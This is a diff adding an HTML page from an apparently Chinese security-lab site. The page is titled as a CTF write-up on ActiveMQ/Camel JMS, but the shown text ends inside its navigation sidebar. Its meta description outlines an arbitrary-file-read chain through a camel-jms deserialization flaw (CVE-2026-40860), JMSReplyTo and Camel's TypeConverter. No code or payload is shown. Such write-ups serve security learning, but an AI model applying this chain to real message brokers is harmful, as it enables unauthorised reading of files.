@@ -1,0 +1,2350 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>de5er1umWriteUp — ActiveMQ/Camel JMS | © 哨兵</title>
+  <meta name="description" content="de5er1um CTF 题目解题记录，利用 camel-jms 4.18.2 反序列化修复不完整（CVE-2026-40860）配合 JMSReplyTo 回复机制与 Camel TypeConverter 的 URL-to-String 文件读取行为，实现白名单类下的任意文件读取，获取网关容器 /flag。">
+
+  <head>
+<meta charset="utf-8">
+<!--dev siwtch-->
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name='mobile-web-app-capable' content='yes'/>
+<meta name='full-screen' content='true'/>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<!--dev switch end-->
+<meta name="description" content="本站由哨兵安全实验室支持创办">
+
+    <meta name="baidu-site-verification" content="codeva-Bt0LqEvH6L" />
+<link rel="shortcut icon" href="/assets/img/favicon.png">
+<link type="application/atom+xml" rel="alternate" href="/feed.xml" title="© 哨兵" />
+
+
+
+
+<!-- Open Graph metadata -->
+<meta property="og:type" content="website" />
+<meta property="og:title" content="de5er1umWriteUp — ActiveMQ/Camel JMS | © 哨兵" />
+<meta property="og:description" content="本站由哨兵安全实验室支持创办" />
+<meta property="og:image" content="https://bin4xin.github.io/assets/img/logo-share.png" /> <!-- WeChat requires that thumbnail image is larger than 300x300 -->
+<meta property="og:url" content="https://bin4xin.github.io/document/00_ctf/01_de5er1um_wp/" />
+<title> de5er1umWriteUp — ActiveMQ/Camel JMS | © 哨兵 | SENTINEL SECURITY, LAB</title>
+<link rel="stylesheet" href="/assets/css/cate-document.css">
+<link rel="stylesheet" type="text/css" href="/assets/css/pace-minimal.css">
+<link rel="stylesheet" type="text/css" href="/assets/css/footer.css">
+<!-- Bootstrap core CSS -->
+<link href="/assets/css/bootstrap.css" rel="stylesheet">
+<link href="/assets/css/bilibili_icon.css" rel="stylesheet">
+
+    <!-- Custom styles for this template -->
+<link href="/assets/css/style.css" rel="stylesheet">
+<link href="/assets/css/font-awesome.min.css" rel="stylesheet">
+<link href="/assets/css/font-awesome-v4-shims.min.css" rel="stylesheet">
+<link rel="stylesheet" type="text/css" href="/assets/css/card.css">
+
+<script src="/assets/js/jquery.min.js"></script>
+<!-- #### defer load ####################################################################################-->
+<script src="/assets/js/jquery_lazyload/1.9.7/jquery.lazyload.min.js"></script>
+<script defer src="/assets/js/pace.min.js"></script>
+<!-- #### defer load end ################################################################################-->
+
+<script defer src="/assets/js/jquery.sticky/1.0.4/jquery.sticky.js"></script>
+<script src="/assets/js/bootstrap.min.js"></script>
+
+
+</head>
+
+  <link rel="stylesheet" href="/assets/css/all.min.css">
+</head>
+<body>
+    <div class="prefers-cs" role="group" aria-label="切换颜色主题">
+    <button class="prefers-cs-btn" data-pref="light" title="亮色模式">
+      <i class="fas fa-sun"></i>
+      <span class="prefers-cs-label">Light</span>
+    </button>
+    <button class="prefers-cs-btn" data-pref="auto" title="跟随系统">
+      <i class="fas fa-circle-half-stroke"></i>
+      <span class="prefers-cs-label">Auto</span>
+    </button>
+    <button class="prefers-cs-btn" data-pref="dark" title="暗色模式">
+      <i class="fas fa-moon"></i>
+      <span class="prefers-cs-label">Dark</span>
+    </button>
+  </div>
+  
+  <script>
+  (function(){
+    'use strict';
+  
+    var KEY  = 'prefers-color-scheme';
+    var btns = document.querySelectorAll('.prefers-cs-btn');
+  
+    function getSystemTheme(){
+      return window.matchMedia('(prefers-color-scheme: light)').matches ? 'light' : 'dark';
+    }
+  
+    function applyTheme(theme){
+      if(theme === 'auto'){
+        theme = getSystemTheme();
+      }
+      document.documentElement.setAttribute('data-theme', theme);
+    }
+  
+    function updateActiveState(pref){
+      btns.forEach(function(b){
+        b.classList.toggle('is-active', b.getAttribute('data-pref') === pref);
+      });
+    }
+  
+    // Init
+    var saved = localStorage.getItem(KEY) || 'auto';
+    applyTheme(saved);
+    updateActiveState(saved);
+  
+    // Click handlers
+    btns.forEach(function(btn){
+      btn.addEventListener('click', function(){
+        var pref = this.getAttribute('data-pref');
+        localStorage.setItem(KEY, pref);
+        applyTheme(pref);
+        updateActiveState(pref);
+      });
+    });
+  
+    // System theme change
+    window.matchMedia('(prefers-color-scheme: dark)').addEventListener('change', function(){
+      var current = localStorage.getItem(KEY) || 'auto';
+      if(current === 'auto'){
+        applyTheme('auto');
+      }
+    });
+  })();
+  </script>
+
+  <!-- Mobile sidebar toggle -->
+  <button class="doc-mobile-toggle" id="doc-mobile-toggle">
+    <i class="fas fa-bars-progress"></i>
+  </button>
+
+  <!-- Mobile TOC button -->
+  <button class="doc-toc-mobile-btn" id="doc-toc-mobile-btn" title="目录导航">
+    <i class="fas fa-list-ul"></i>
+  </button>
+
+  <!-- Mobile TOC overlay -->
+  <div class="doc-toc-mobile-overlay" id="doc-toc-mobile-overlay"></div>
+
+  <!-- Mobile TOC panel -->
+  <div class="doc-toc-mobile-panel" id="doc-toc-mobile-panel">
+    <div class="doc-toc-title">目录</div>
+    <ul class="doc-toc-list" id="doc-toc-mobile-list"></ul>
+  </div>
+
+  <div class="doc-wrapper">
+
+    <!-- Sidebar -->
+    <aside class="doc-sidebar" id="doc-sidebar">
+      <div class="doc-brand">
+        <span class="doc-brand-tag">DOCUMENTATION</span>
+        <div class="doc-brand-title">© 哨兵</div>
+        <p class="doc-brand-sub">技术文档与参考手册</p>
+      </div>
+
+      
+
+
+
+
+
+
+
+
+
+<nav class="doc-nav">
+  <div class="doc-nav-header">
+    <i class="fas fa-book-open"></i>
+    <span>文档导航</span>
+  </div>
+
+  <div class="doc-nav-search">
+    <input type="text" id="doc-search" placeholder="搜索文档..." autocomplete="off" />
+    <i class="fas fa-search"></i>
+  </div>
+
+  
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+
+  <div class="doc-nav-group" data-dir="00_ctf">
+    <button class="doc-nav-group-toggle" data-target="doc-group-00_ctf">
+      <i class="fas fa-folder doc-nav-group-icon"></i>
+      <span>CTF</span>
+      <em class="doc-nav-count">5</em>
+      <i class="fas fa-chevron-down doc-nav-arrow"></i>
+    </button>
+
+    <ul class="doc-nav-list" id="doc-group-00_ctf">
+      
+      
+      
+      
+      <li class="doc-nav-item ">
+        <a href="/document/00_ctf/00_overview/" title="数据安全与AI安全理论赛知识点汇编">
+          <i class="fas fa-flag-checkered"></i>
+          <span class="doc-nav-label">知识点汇编</span>
+        </a>
+      </li>
+      
+      <li class="doc-nav-item is-active">
+        <a href="/document/00_ctf/01_de5er1um_wp/" title="de5er1umWriteUp — ActiveMQ/Camel JMS">
+          <i class="fas fa-bug"></i>
+          <span class="doc-nav-label">de5er1um_wp</span>
+        </a>
+      </li>
+      
+      <li class="doc-nav-item ">
+        <a href="/document/00_ctf/02_de5er1um_jar_analysis/" title="de5er1um.jar 逆向分析报告">
+          <i class="fas fa-flag-checkered"></i>
+          <span class="doc-nav-label">de5er1um_jar</span>
+        </a>
+      </li>
+      
+      <li class="doc-nav-item ">
+        <a href="/document/00_ctf/03_echo_server_pwn_wp/" title="echo.rar 逆向分析报告 - 栈溢出漏洞利用">
+          <i class="fas fa-bug"></i>
+          <span class="doc-nav-label">echo溢出分析</span>
+        </a>
+      </li>
+      
+      <li class="doc-nav-item ">
+        <a href="/document/00_ctf/04_project_backup_analysis/" title="project_backup.zip 逆向分析报告 - Git 仓库取证">
+          <i class="fas fa-code-branch"></i>
+          <span class="doc-nav-label">Git备份分析</span>
+        </a>
+      </li>
+      
+    </ul>
+  </div>
+
+  
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+
+  <div class="doc-nav-group" data-dir="01_ransomware">
+    <button class="doc-nav-group-toggle" data-target="doc-group-01_ransomware">
+      <i class="fas fa-folder doc-nav-group-icon"></i>
+      <span>RANSOMWARE</span>
+      <em class="doc-nav-count">6</em>
+      <i class="fas fa-chevron-down doc-nav-arrow"></i>
+    </button>
+
+    <ul class="doc-nav-list" id="doc-group-01_ransomware">
+      
+      
+      
+      
+      <li class="doc-nav-item ">
+        <a href="/document/01_ransomware/00_overview/" title="勒索病毒应急响应技战法">
+          <i class="fas fa-pump-soap"></i>
+          <span class="doc-nav-label">概述</span>
+        </a>
+      </li>
+      
+      <li class="doc-nav-item ">
+        <a href="/document/01_ransomware/01_attack_model/" title="勒索病毒攻击传播模型">
+          <i class="fas fa-pump-soap"></i>
+          <span class="doc-nav-label">传播模型</span>
+        </a>
+      </li>
+      
+      <li class="doc-nav-item ">
+        <a href="/document/01_ransomware/02_isolation/" title="紧急隔离与止血">
+          <i class="fas fa-pump-soap"></i>
+          <span class="doc-nav-label">隔离止血</span>
+        </a>
+      </li>
+      
+      <li class="doc-nav-item ">
+        <a href="/document/01_ransomware/03_assessment/" title="影响评估与取证">
+          <i class="fas fa-pump-soap"></i>
+          <span class="doc-nav-label">评估取证</span>
+        </a>
+      </li>
+      
+      <li class="doc-nav-item ">
+        <a href="/document/01_ransomware/04_recovery/" title="数据恢复与业务重建">
+          <i class="fas fa-pump-soap"></i>
+          <span class="doc-nav-label">恢复重建</span>
+        </a>
+      </li>
+      
+      <li class="doc-nav-item ">
+        <a href="/document/01_ransomware/05_hardening/" title="安全加固与复盘">
+          <i class="fas fa-pump-soap"></i>
+          <span class="doc-nav-label">加固复盘</span>
+        </a>
+      </li>
+      
+    </ul>
+  </div>
+
+  
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+
+  <div class="doc-nav-group" data-dir="02_data_leak">
+    <button class="doc-nav-group-toggle" data-target="doc-group-02_data_leak">
+      <i class="fas fa-folder doc-nav-group-icon"></i>
+      <span>DATA LEAK</span>
+      <em class="doc-nav-count">4</em>
+      <i class="fas fa-chevron-down doc-nav-arrow"></i>
+    </button>
+
+    <ul class="doc-nav-list" id="doc-group-02_data_leak">
+      
+      
+      
+      
+      <li class="doc-nav-item ">
+        <a href="/document/02_data_leak/00_overview/" title="内部数据泄露应急溯源与取证技战法">
+          <i class="fas fa-user-secret"></i>
+          <span class="doc-nav-label">概述</span>
+        </a>
+      </li>
+      
+      <li class="doc-nav-item ">
+        <a href="/document/02_data_leak/01_discovery/" title="泄露发现与紧急响应">
+          <i class="fas fa-user-secret"></i>
+          <span class="doc-nav-label">发现响应</span>
+        </a>
+      </li>
+      
+      <li class="doc-nav-item ">
+        <a href="/document/02_data_leak/02_tracing/" title="数据流转溯源与证据固定">
+          <i class="fas fa-user-secret"></i>
+          <span class="doc-nav-label">溯源取证</span>
+        </a>
+      </li>
+      
+      <li class="doc-nav-item ">
+        <a href="/document/02_data_leak/03_assessment/" title="影响评估与处置建议">
+          <i class="fas fa-user-secret"></i>
+          <span class="doc-nav-label">评估处置</span>
+        </a>
+      </li>
+      
+    </ul>
+  </div>
+
+  
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+
+  <div class="doc-nav-group" data-dir="03_ddos">
+    <button class="doc-nav-group-toggle" data-target="doc-group-03_ddos">
+      <i class="fas fa-folder doc-nav-group-icon"></i>
+      <span>DDOS</span>
+      <em class="doc-nav-count">5</em>
+      <i class="fas fa-chevron-down doc-nav-arrow"></i>
+    </button>
+
+    <ul class="doc-nav-list" id="doc-group-03_ddos">
+      
+      
+      
+      
+      <li class="doc-nav-item ">
+        <a href="/document/03_ddos/00_overview/" title="DDoS 攻击应急响应技战法">
+          <i class="fas fa-bolt"></i>
+          <span class="doc-nav-label">概述</span>
+        </a>
+      </li>
+      
+      <li class="doc-nav-item ">
+        <a href="/document/03_ddos/01_detection/" title="攻击发现与紧急响应">
+          <i class="fas fa-bolt"></i>
+          <span class="doc-nav-label">发现响应</span>
+        </a>
+      </li>
+      
+      <li class="doc-nav-item ">
+        <a href="/document/03_ddos/02_cleaning/" title="流量清洗与分流">
+          <i class="fas fa-bolt"></i>
+          <span class="doc-nav-label">流量清洗</span>
+        </a>
+      </li>
+      
+      <li class="doc-nav-item ">
+        <a href="/document/03_ddos/03_fallback/" title="业务保底运行">
+          <i class="fas fa-bolt"></i>
+          <span class="doc-nav-label">业务保底</span>
+        </a>
+      </li>
+      
+      <li class="doc-nav-item ">
+        <a href="/document/03_ddos/04_recovery/" title="恢复与复盘">
+          <i class="fas fa-bolt"></i>
+          <span class="doc-nav-label">恢复复盘</span>
+        </a>
+      </li>
+      
+    </ul>
+  </div>
+
+  
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+
+  <div class="doc-nav-group" data-dir="04_supply_chain">
+    <button class="doc-nav-group-toggle" data-target="doc-group-04_supply_chain">
+      <i class="fas fa-folder doc-nav-group-icon"></i>
+      <span>SUPPLY CHAIN</span>
+      <em class="doc-nav-count">5</em>
+      <i class="fas fa-chevron-down doc-nav-arrow"></i>
+    </button>
+
+    <ul class="doc-nav-list" id="doc-group-04_supply_chain">
+      
+      
+      
+      
+      <li class="doc-nav-item ">
+        <a href="/document/04_supply_chain/00_overview/" title="供应链攻击生产环境被控应急切换与重建">
+          <i class="fas fa-link"></i>
+          <span class="doc-nav-label">概述</span>
+        </a>
+      </li>
+      
+      <li class="doc-nav-item ">
+        <a href="/document/04_supply_chain/01_discovery/" title="攻击发现与威胁确认">
+          <i class="fas fa-link"></i>
+          <span class="doc-nav-label">发现确认</span>
+        </a>
+      </li>
+      
+      <li class="doc-nav-item ">
+        <a href="/document/04_supply_chain/02_isolation/" title="紧急隔离与业务切换">
+          <i class="fas fa-link"></i>
+          <span class="doc-nav-label">隔离切换</span>
+        </a>
+      </li>
+      
+      <li class="doc-nav-item ">
+        <a href="/document/04_supply_chain/03_cleanup/" title="全面排查与清除">
+          <i class="fas fa-link"></i>
+          <span class="doc-nav-label">排查清除</span>
+        </a>
+      </li>
+      
+      <li class="doc-nav-item ">
+        <a href="/document/04_supply_chain/04_rebuild/" title="环境重建与加固">
+          <i class="fas fa-link"></i>
+          <span class="doc-nav-label">重建加固</span>
+        </a>
+      </li>
+      
+    </ul>
+  </div>
+
+  
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+
+  <div class="doc-nav-group" data-dir="05_attck_soc">
+    <button class="doc-nav-group-toggle" data-target="doc-group-05_attck_soc">
+      <i class="fas fa-folder doc-nav-group-icon"></i>
+      <span>ATTCK SOC</span>
+      <em class="doc-nav-count">5</em>
+      <i class="fas fa-chevron-down doc-nav-arrow"></i>
+    </button>
+
+    <ul class="doc-nav-list" id="doc-group-05_attck_soc">
+      
+      
+      
+      
+      <li class="doc-nav-item ">
+        <a href="/document/05_attck_soc/00_overview/" title="ATT&CK 驱动安全运营技战法">
+          <i class="fas fa-crosshairs"></i>
+          <span class="doc-nav-label">概述</span>
+        </a>
+      </li>
+      
+      <li class="doc-nav-item ">
+        <a href="/document/05_attck_soc/01_mapping/" title="告警映射与 ATT&CK 分类">
+          <i class="fas fa-crosshairs"></i>
+          <span class="doc-nav-label">映射分类</span>
+        </a>
+      </li>
+      
+      <li class="doc-nav-item ">
+        <a href="/document/05_attck_soc/02_noise_reduction/" title="告警降噪与规则优化">
+          <i class="fas fa-crosshairs"></i>
+          <span class="doc-nav-label">降噪优化</span>
+        </a>
+      </li>
+      
+      <li class="doc-nav-item ">
+        <a href="/document/05_attck_soc/03_fallback/" title="业务保底运行">
+          <i class="fas fa-crosshairs"></i>
+          <span class="doc-nav-label">业务保底</span>
+        </a>
+      </li>
+      
+      <li class="doc-nav-item ">
+        <a href="/document/05_attck_soc/04_recovery/" title="恢复与复盘">
+          <i class="fas fa-crosshairs"></i>
+          <span class="doc-nav-label">恢复复盘</span>
+        </a>
+      </li>
+      
+    </ul>
+  </div>
+
+  
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+
+  <div class="doc-nav-group" data-dir="06_ueba_hunting">
+    <button class="doc-nav-group-toggle" data-target="doc-group-06_ueba_hunting">
+      <i class="fas fa-folder doc-nav-group-icon"></i>
+      <span>UEBA HUNTING</span>
+      <em class="doc-nav-count">4</em>
+      <i class="fas fa-chevron-down doc-nav-arrow"></i>
+    </button>
+
+    <ul class="doc-nav-list" id="doc-group-06_ueba_hunting">
+      
+      
+      
+      
+      <li class="doc-nav-item ">
+        <a href="/document/06_ueba_hunting/00_overview/" title="UEBA 驱动内部威胁狩猎技战法">
+          <i class="fas fa-user-shield"></i>
+          <span class="doc-nav-label">概述</span>
+        </a>
+      </li>
+      
+      <li class="doc-nav-item ">
+        <a href="/document/06_ueba_hunting/01_baseline/" title="数据采集与行为基线构建">
+          <i class="fas fa-user-shield"></i>
+          <span class="doc-nav-label">基线构建</span>
+        </a>
+      </li>
+      
+      <li class="doc-nav-item ">
+        <a href="/document/06_ueba_hunting/02_hunting/" title="异常行为检测与狩猎">
+          <i class="fas fa-user-shield"></i>
+          <span class="doc-nav-label">检测狩猎</span>
+        </a>
+      </li>
+      
+      <li class="doc-nav-item ">
+        <a href="/document/06_ueba_hunting/03_investigation/" title="调查响应与模型迭代">
+          <i class="fas fa-user-shield"></i>
+          <span class="doc-nav-label">调查迭代</span>
+        </a>
+      </li>
+      
+    </ul>
+  </div>
+
+  
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+
+  <div class="doc-nav-group" data-dir="07_hw_exercise">
+    <button class="doc-nav-group-toggle" data-target="doc-group-07_hw_exercise">
+      <i class="fas fa-folder doc-nav-group-icon"></i>
+      <span>HW EXERCISE</span>
+      <em class="doc-nav-count">4</em>
+      <i class="fas fa-chevron-down doc-nav-arrow"></i>
+    </button>
+
+    <ul class="doc-nav-list" id="doc-group-07_hw_exercise">
+      
+      
+      
+      
+      <li class="doc-nav-item ">
+        <a href="/document/07_hw_exercise/00_overview/" title="攻防演练防守方协同作战技战法">
+          <i class="fas fa-chess"></i>
+          <span class="doc-nav-label">概述</span>
+        </a>
+      </li>
+      
+      <li class="doc-nav-item ">
+        <a href="/document/07_hw_exercise/01_preparation/" title="演练前备战">
+          <i class="fas fa-chess"></i>
+          <span class="doc-nav-label">备战</span>
+        </a>
+      </li>
+      
+      <li class="doc-nav-item ">
+        <a href="/document/07_hw_exercise/02_battle/" title="演练中实战作战">
+          <i class="fas fa-chess"></i>
+          <span class="doc-nav-label">实战</span>
+        </a>
+      </li>
+      
+      <li class="doc-nav-item ">
+        <a href="/document/07_hw_exercise/03_review/" title="演练后复盘">
+          <i class="fas fa-chess"></i>
+          <span class="doc-nav-label">复盘</span>
+        </a>
+      </li>
+      
+    </ul>
+  </div>
+
+  
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+
+  <div class="doc-nav-group" data-dir="08_threat_intelligence">
+    <button class="doc-nav-group-toggle" data-target="doc-group-08_threat_intelligence">
+      <i class="fas fa-folder doc-nav-group-icon"></i>
+      <span>THREAT INTELLIGENCE</span>
+      <em class="doc-nav-count">4</em>
+      <i class="fas fa-chevron-down doc-nav-arrow"></i>
+    </button>
+
+    <ul class="doc-nav-list" id="doc-group-08_threat_intelligence">
+      
+      
+      
+      
+      <li class="doc-nav-item ">
+        <a href="/document/08_threat_intelligence/00_overview/" title="威胁情报运营技战法">
+          <i class="fas fa-database"></i>
+          <span class="doc-nav-label">概述</span>
+        </a>
+      </li>
+      
+      <li class="doc-nav-item ">
+        <a href="/document/08_threat_intelligence/01_collection/" title="情报采集与标准化处理">
+          <i class="fas fa-database"></i>
+          <span class="doc-nav-label">采集标准化</span>
+        </a>
+      </li>
+      
+      <li class="doc-nav-item ">
+        <a href="/document/08_threat_intelligence/02_hunting/" title="异常行为检测与狩猎">
+          <i class="fas fa-database"></i>
+          <span class="doc-nav-label">检测狩猎</span>
+        </a>
+      </li>
+      
+      <li class="doc-nav-item ">
+        <a href="/document/08_threat_intelligence/03_investigation/" title="调查响应与模型迭代">
+          <i class="fas fa-database"></i>
+          <span class="doc-nav-label">调查迭代</span>
+        </a>
+      </li>
+      
+    </ul>
+  </div>
+
+  
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+
+  <div class="doc-nav-group" data-dir="09_vendor_security">
+    <button class="doc-nav-group-toggle" data-target="doc-group-09_vendor_security">
+      <i class="fas fa-folder doc-nav-group-icon"></i>
+      <span>VENDOR SECURITY</span>
+      <em class="doc-nav-count">5</em>
+      <i class="fas fa-chevron-down doc-nav-arrow"></i>
+    </button>
+
+    <ul class="doc-nav-list" id="doc-group-09_vendor_security">
+      
+      
+      
+      
+      <li class="doc-nav-item ">
+        <a href="/document/09_vendor_security/00_overview/" title="第三方供应商安全评估技战法">
+          <i class="fas fa-handshake"></i>
+          <span class="doc-nav-label">概述</span>
+        </a>
+      </li>
+      
+      <li class="doc-nav-item ">
+        <a href="/document/09_vendor_security/01_threat_model/" title="第三方供应商威胁模型与风险全景">
+          <i class="fas fa-handshake"></i>
+          <span class="doc-nav-label">威胁模型</span>
+        </a>
+      </li>
+      
+      <li class="doc-nav-item ">
+        <a href="/document/09_vendor_security/02_assessment/" title="供应商安全准入评估">
+          <i class="fas fa-handshake"></i>
+          <span class="doc-nav-label">准入评估</span>
+        </a>
+      </li>
+      
+      <li class="doc-nav-item ">
+        <a href="/document/09_vendor_security/03_contract/" title="合同约束与安全基线约定">
+          <i class="fas fa-handshake"></i>
+          <span class="doc-nav-label">合同约束</span>
+        </a>
+      </li>
+      
+      <li class="doc-nav-item ">
+        <a href="/document/09_vendor_security/04_monitoring/" title="持续监控与定期复评">
+          <i class="fas fa-handshake"></i>
+          <span class="doc-nav-label">持续监控</span>
+        </a>
+      </li>
+      
+    </ul>
+  </div>
+
+  
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+
+  <div class="doc-nav-group" data-dir="10_zero_trust_nac">
+    <button class="doc-nav-group-toggle" data-target="doc-group-10_zero_trust_nac">
+      <i class="fas fa-folder doc-nav-group-icon"></i>
+      <span>ZERO TRUST NAC</span>
+      <em class="doc-nav-count">4</em>
+      <i class="fas fa-chevron-down doc-nav-arrow"></i>
+    </button>
+
+    <ul class="doc-nav-list" id="doc-group-10_zero_trust_nac">
+      
+      
+      
+      
+      <li class="doc-nav-item ">
+        <a href="/document/10_zero_trust_nac/00_overview/" title="混合办公终端准入与零信任技战法">
+          <i class="fas fa-shield-alt"></i>
+          <span class="doc-nav-label">概述</span>
+        </a>
+      </li>
+      
+      <li class="doc-nav-item ">
+        <a href="/document/10_zero_trust_nac/01_asset_baseline/" title="终端资产清查与合规基线">
+          <i class="fas fa-shield-alt"></i>
+          <span class="doc-nav-label">资产清查</span>
+        </a>
+      </li>
+      
+      <li class="doc-nav-item ">
+        <a href="/document/10_zero_trust_nac/02_nac_deploy/" title="准入控制策略部署与实施">
+          <i class="fas fa-shield-alt"></i>
+          <span class="doc-nav-label">准入部署</span>
+        </a>
+      </li>
+      
+      <li class="doc-nav-item ">
+        <a href="/document/10_zero_trust_nac/03_zt_deepen/" title="零信任策略深化与持续运营">
+          <i class="fas fa-shield-alt"></i>
+          <span class="doc-nav-label">零信任深化</span>
+        </a>
+      </li>
+      
+    </ul>
+  </div>
+
+  
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+
+  <div class="doc-nav-group" data-dir="11_vuln_priority">
+    <button class="doc-nav-group-toggle" data-target="doc-group-11_vuln_priority">
+      <i class="fas fa-folder doc-nav-group-icon"></i>
+      <span>VULN PRIORITY</span>
+      <em class="doc-nav-count">4</em>
+      <i class="fas fa-chevron-down doc-nav-arrow"></i>
+    </button>
+
+    <ul class="doc-nav-list" id="doc-group-11_vuln_priority">
+      
+      
+      
+      
+      <li class="doc-nav-item ">
+        <a href="/document/11_vuln_priority/00_overview/" title="漏洞修补优先级量化管理技战法">
+          <i class="fas fa-bug"></i>
+          <span class="doc-nav-label">概述</span>
+        </a>
+      </li>
+      
+      <li class="doc-nav-item ">
+        <a href="/document/11_vuln_priority/01_asset_correlation/" title="漏洞资产关联与信息采集">
+          <i class="fas fa-bug"></i>
+          <span class="doc-nav-label">资产关联</span>
+        </a>
+      </li>
+      
+      <li class="doc-nav-item ">
+        <a href="/document/11_vuln_priority/02_scoring/" title="漏洞优先级量化评估">
+          <i class="fas fa-bug"></i>
+          <span class="doc-nav-label">量化评估</span>
+        </a>
+      </li>
+      
+      <li class="doc-nav-item ">
+        <a href="/document/11_vuln_priority/03_patch_loop/" title="修补跟踪与闭环管理">
+          <i class="fas fa-bug"></i>
+          <span class="doc-nav-label">修补闭环</span>
+        </a>
+      </li>
+      
+    </ul>
+  </div>
+
+  
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+
+  <div class="doc-nav-group" data-dir="12_data_classification">
+    <button class="doc-nav-group-toggle" data-target="doc-group-12_data_classification">
+      <i class="fas fa-folder doc-nav-group-icon"></i>
+      <span>DATA CLASSIFICATION</span>
+      <em class="doc-nav-count">4</em>
+      <i class="fas fa-chevron-down doc-nav-arrow"></i>
+    </button>
+
+    <ul class="doc-nav-list" id="doc-group-12_data_classification">
+      
+      
+      
+      
+      <li class="doc-nav-item ">
+        <a href="/document/12_data_classification/00_overview/" title="数据分类分级流转风险监控技战法">
+          <i class="fas fa-database"></i>
+          <span class="doc-nav-label">概述</span>
+        </a>
+      </li>
+      
+      <li class="doc-nav-item ">
+        <a href="/document/12_data_classification/01_identification/" title="数据资产识别与分类分级标签化">
+          <i class="fas fa-database"></i>
+          <span class="doc-nav-label">识别标签化</span>
+        </a>
+      </li>
+      
+      <li class="doc-nav-item ">
+        <a href="/document/12_data_classification/02_flow_monitoring/" title="数据流转路径映射与监控部署">
+          <i class="fas fa-database"></i>
+          <span class="doc-nav-label">流转监控</span>
+        </a>
+      </li>
+      
+      <li class="doc-nav-item ">
+        <a href="/document/12_data_classification/03_alert_loop/" title="风险预警与处置闭环">
+          <i class="fas fa-database"></i>
+          <span class="doc-nav-label">风险预警</span>
+        </a>
+      </li>
+      
+    </ul>
+  </div>
+
+  
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+
+  <div class="doc-nav-group" data-dir="13_firewall_policy">
+    <button class="doc-nav-group-toggle" data-target="doc-group-13_firewall_policy">
+      <i class="fas fa-folder doc-nav-group-icon"></i>
+      <span>FIREWALL POLICY</span>
+      <em class="doc-nav-count">4</em>
+      <i class="fas fa-chevron-down doc-nav-arrow"></i>
+    </button>
+
+    <ul class="doc-nav-list" id="doc-group-13_firewall_policy">
+      
+      
+      
+      
+      <li class="doc-nav-item ">
+        <a href="/document/13_firewall_policy/00_overview/" title="防火墙与安全组策略精细化梳理与冗余清理技战法">
+          <i class="fas fa-filter"></i>
+          <span class="doc-nav-label">概述</span>
+        </a>
+      </li>
+      
+      <li class="doc-nav-item ">
+        <a href="/document/13_firewall_policy/01_discovery/" title="策略规则全量采集与分析">
+          <i class="fas fa-filter"></i>
+          <span class="doc-nav-label">采集分析</span>
+        </a>
+      </li>
+      
+      <li class="doc-nav-item ">
+        <a href="/document/13_firewall_policy/02_classification/" title="规则分类与优化">
+          <i class="fas fa-filter"></i>
+          <span class="doc-nav-label">分类优化</span>
+        </a>
+      </li>
+      
+      <li class="doc-nav-item ">
+        <a href="/document/13_firewall_policy/03_cleanup/" title="清理实施与持续治理">
+          <i class="fas fa-filter"></i>
+          <span class="doc-nav-label">清理治理</span>
+        </a>
+      </li>
+      
+    </ul>
+  </div>
+
+  
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+
+  <div class="doc-nav-group" data-dir="14_linux_baseline">
+    <button class="doc-nav-group-toggle" data-target="doc-group-14_linux_baseline">
+      <i class="fas fa-folder doc-nav-group-icon"></i>
+      <span>LINUX BASELINE</span>
+      <em class="doc-nav-count">6</em>
+      <i class="fas fa-chevron-down doc-nav-arrow"></i>
+    </button>
+
+    <ul class="doc-nav-list" id="doc-group-14_linux_baseline">
+      
+      
+      
+      
+      <li class="doc-nav-item ">
+        <a href="/document/14_linux_baseline/00_overview/" title="Linux服务器安全基线加固技战法">
+          <i class="fas fa-terminal"></i>
+          <span class="doc-nav-label">概述</span>
+        </a>
+      </li>
+      
+      <li class="doc-nav-item ">
+        <a href="/document/14_linux_baseline/01_baseline_standard/" title="安全基线制定">
+          <i class="fas fa-terminal"></i>
+          <span class="doc-nav-label">基线制定</span>
+        </a>
+      </li>
+      
+      <li class="doc-nav-item ">
+        <a href="/document/14_linux_baseline/02_hardening/" title="基线配置实施">
+          <i class="fas fa-terminal"></i>
+          <span class="doc-nav-label">安全加固</span>
+        </a>
+      </li>
+      
+      <li class="doc-nav-item ">
+        <a href="/document/14_linux_baseline/03_compliance/" title="自动化核查与持续合规">
+          <i class="fas fa-terminal"></i>
+          <span class="doc-nav-label">自动化核查</span>
+        </a>
+      </li>
+      
+      <li class="doc-nav-item ">
+        <a href="/document/14_linux_baseline/04_checklist/" title="基线核查清单速查表">
+          <i class="fas fa-terminal"></i>
+          <span class="doc-nav-label">核查清单</span>
+        </a>
+      </li>
+      
+      <li class="doc-nav-item ">
+        <a href="/document/14_linux_baseline/05_hardening_script/" title="自动化加固脚本参考">
+          <i class="fas fa-terminal"></i>
+          <span class="doc-nav-label">加固脚本</span>
+        </a>
+      </li>
+      
+    </ul>
+  </div>
+
+  
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+
+  <div class="doc-nav-group" data-dir="15_k8s_networkpolicy">
+    <button class="doc-nav-group-toggle" data-target="doc-group-15_k8s_networkpolicy">
+      <i class="fas fa-folder doc-nav-group-icon"></i>
+      <span>K8S NETWORKPOLICY</span>
+      <em class="doc-nav-count">5</em>
+      <i class="fas fa-chevron-down doc-nav-arrow"></i>
+    </button>
+
+    <ul class="doc-nav-list" id="doc-group-15_k8s_networkpolicy">
+      
+      
+      
+      
+      <li class="doc-nav-item ">
+        <a href="/document/15_k8s_networkpolicy/00_overview/" title="Kubernetes网络策略精细化隔离技战法">
